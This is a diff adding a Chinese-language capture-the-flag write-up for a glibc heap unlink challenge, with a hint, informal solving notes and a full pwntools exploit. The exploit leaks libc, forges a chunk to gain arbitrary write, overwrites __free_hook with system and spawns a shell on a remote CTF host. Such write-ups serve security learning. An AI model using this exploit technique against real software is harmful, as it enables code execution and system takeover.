@@ -22,6 +22,144 @@
 >
 > hint：通过malloc正常获得的指针指向fd的位置，该指针存储在pie上的heaplist结构体内。而对于unsorted bins的双链表结构，其fd和bk指向的位置为堆块头部，相差0x10。如果我们要构造unlink攻击，我们应该尝试布置heaplist里的指针指向一个伪造的chunk头部而不是一个chunk的fd字段。当一个堆块的prev_inuse被设置为0时，这个堆块被释放的时候就会根据prev_size尝试与之前的堆块合并。设置好prev_size，size的大小，并构造fd、bk（指向heaplist内指针-0x18和-0x10处）使得堆块沿着fd->bk和bk->fd可以回到自己（绕过检查），接下来堆块进行unlink解链操作，导致heaplist内出现自指指针，此时直接edit和show就可以拿到任意读写。
 
+### 解题思路
+
+这个是一个unlink
+
+我说这个unlink真的有点烦的虽然其实我还是没太搞懂我咋写出来的（懂一半吧）
+
+我申请了一个size0的chunk，没啥用，但是很好玩（其实是忘记删了就这样吧）
+
+嗯就是伪造一个和bss表上的chunk[]指向的地址一样的chunk
+
+然后对这个chunk进行unlink操作
+
+然后还要记得伪造后面一个chunk的prev size
+
+我去我知道为什么那些unlink文章这么诡异了
+
+我也捋不清楚啊
+
+就是伪造一个假的chunk,但是要伪造得特别真
+
+嗯
+
+然后就可以让伪造的fd和bk都变得特别真
+
+然后就能unlink往fd+0x18 bk+0x10的地方
+
+写啥来着。写fd还是bk
+
+不管了（（
+反正试几下就能试出来是哪里写到哪里了
+
+对然后就拿到任意写了
+
+好耶！
+
+### exp
+
+```
+from pwn import*
+filename = './chal'
+libc = './libc-2.23.so'
+
+e = ELF(filename)
+libc = ELF(libc)
+context(arch=e.arch,os=e.os)
+context.log_level = 'debug'
+
+sla = lambda x,s:p.sendlineafter(x,s)
+sl = lambda s:p.sendline(s)
+sa = lambda x,s:p.sendafter(x,s)
+s = lambda s:p.send(s)
+
+p = process(filename)
+# gdb.attach(p)
+p = remote('x.ctf.neuqcsa.cn',33013)
+
+def free(a):
+    sla(b'> ',b'4')
+    sla(b'Index: ',str(a))  
+
+def show(a):
+    sla(b'> ',b'2')
+    sla(b'Index: ',str(a))  
+
+def add(a,b,c):
+    sla(b'> ',b'1')
+    sla(b'Index: ',str(a))
+    sla(b'Size: ',str(b))
+    sa(b'Content: ',c)
+
+def edit(a,b):
+    sla(b'> ',b'3')
+    sla(b'Index: ',str(a))
+    sla(b'Content: ',b) 
+
+add(0,0x110,b'\n')
+
+add(1,0x140,b'\n')
+
+free(0)
+add(2,0x112,b'\n')
+
+show(2)
+# pause()
+p.recvuntil(b'Content: ')
+libca = p.recv(6)
+a_libc = u64(libca.ljust(8))
+a_libc = a_libc - 0x3c4b00
+a_libc = a_libc - 0x2020000000000000
+
+free_hook = a_libc + 0x3c67a8
+system = a_libc + 0x453a0
+
+# payload = p64(0x6024a0-0x18)+p64(0x6024a0-0x10)
+payload =  p64(0x0)+p64(0x110)
+payload += p64(0x6024b0-0x18)+p64(0x6024b0-0x10)
+payload += b'a'*0xf0
+payload += b'\x10'
+payload += b'\x01'
+free(0)
+
+sla(b'> ',b'1')
+sla(b'Index: ',str(3))
+sla(b'Size: ',str(0))
+
+add(4,20,b'/bin/sh\x00\n')
+add(5,20,b'\n')
+# pause()
+edit(2,payload)
+
+# pause()
+free(1)
+
+
+payload = p64(free_hook)
+payload+= p64(free_hook)
+# payload+= p64(0)
+payload+= p64(free_hook)
+payload+= p64(free_hook)
+payload+= p64(free_hook)
+payload+= p64(free_hook)
+payload+= p64(free_hook)
+payload+= p64(free_hook)
+edit(2,payload)
+
+# payload+= b'\x00'*0x138
+# payload+= p64(0)
+
+payload = p64(system)
+
+edit(5,payload)
+payload = b'/bin/sh\x00'
+edit(4,payload)
+
+free(4)
+
+p.interactive()
+```
 
 ### 文章阅读及笔记
 #### [文章一（来自题干）（不是该题知识点）](https://arttnba3.cn/2022/08/30/HARDWARE-0X00-PCI_DEVICE/)
